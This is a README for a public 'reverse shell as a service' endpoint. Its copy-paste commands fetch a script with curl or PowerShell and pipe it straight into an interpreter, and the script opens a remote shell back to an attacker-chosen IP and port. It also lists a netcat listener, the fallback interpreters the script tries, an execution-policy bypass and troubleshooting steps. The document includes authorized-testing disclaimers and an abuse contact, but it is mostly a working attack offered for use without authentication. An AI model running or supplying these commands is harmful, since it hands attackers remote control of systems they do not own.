# shell.arnaupg.com

> Reverse shell as a service. One URL, one pipe, a shell.

![Node](https://img.shields.io/badge/node-24.x-339933?logo=node.js&logoColor=white)
![Runtime](https://img.shields.io/badge/runtime-Vercel%20Functions-000000?logo=vercel&logoColor=white)
![Dependencies](https://img.shields.io/badge/dependencies-none-success)
![Use](https://img.shields.io/badge/use-authorized%20testing-critical)

A single serverless endpoint that returns a reverse shell script in plain text.
The script checks which interpreter is available on the target and uses the
first one that works. Nothing to install on the target.

Made for controlled environments and machines you have **written permission**
to test. See [Legal](#legal) for the details.

---

## How it works

```bash
curl https://shell.arnaupg.com/1.2.3.4:1337 | sh
```

The target never downloads a binary. It gets a short shell script that tries,
in order:

| # | Interpreter | Notes |
|---|---|---|
| 1 | `python3` | most common on modern Linux |
| 2 | `python` | older distros |
| 3 | `perl` | present on many base images |
| 4 | `bash` | uses `/dev/tcp`, covers Debian and Ubuntu where `/bin/sh` is dash |
| 5 | `nc` | needs `mkfifo` |
| 6 | `/bin/sh` + `/dev/tcp` | last resort, works where `/bin/sh` is bash (macOS) |

Windows is a separate route, because **the server cannot detect the target OS**:
curl on Windows and curl on Linux send the same request. The caller picks the
route, not the service.

---

## Usage

### 1. Start a listener

```bash
nc -lvnp 1337
```

### 2. Fire the payload on the target

**Unix**

```bash
curl https://shell.arnaupg.com/1.2.3.4:1337 | sh
```

**Windows — PowerShell**

```powershell
irm https://shell.arnaupg.com/win/1.2.3.4:1337 | iex
```

**Windows — cmd.exe**

```bat
curl https://shell.arnaupg.com/win/1.2.3.4:1337 | powershell -nop -c -
```

Both Windows commands hit the same route and receive the same script; only the
interpreter after the pipe changes. If the machine blocks script execution, add
`-ExecutionPolicy Bypass` to the cmd variant.

### 3. Get a shell

Replace `1.2.3.4` with your public IP and `1337` with your listening port.

---

## Troubleshooting

| What you see | What it means |
|---|---|
| `no compatible interpreter` | Target has no python3, python, perl, nc or `/dev/tcp` |
| `Connection refused` | Target can reach you, but nothing is listening on that port |
| Usage text only | Invalid route — missing IP, or port outside 1-65535 |
| Nothing at all | The script never arrived: network, DNS or firewall |

Add `-fsSL` to see the real error instead of silence:

```bash
curl -fsSL https://shell.arnaupg.com/1.2.3.4:1337 | sh
```

Inspect before executing:

```bash
curl -fsSL https://shell.arnaupg.com/1.2.3.4:1337 -o /tmp/r.sh
less /tmp/r.sh
sh /tmp/r.sh
```

---

## Notes

- **Validation.** `host:port` is checked against a strict allowlist before it
  goes anywhere near the script. `/1.2.3.4:1337;id` returns the usage text.
- **Loud failures.** Every payload reports its own connection error, so a dead
  listener looks different from a missing interpreter.
- **No cache.** `Cache-Control: no-store` keeps a CDN from serving one target's
  script to another.
- **Open by design.** No key, no auth. Anyone who knows the URL can use it.

---

## Legal

Use this only against machines you own or have **explicit written permission**
to test. The domain serving the script ends up in the target's logs, and the
consequences of unauthorized use fall on whoever runs it. This project does not
grant you permission to access anything.

This service keeps no records of the requests it receives. There is no
database, no analytics and no request logging.

---

## Abuse

If this service is being used against infrastructure you own, write to
**abuse@arnaupg.com** with the IP, timestamp and affected host. The service will
be restricted or taken down.
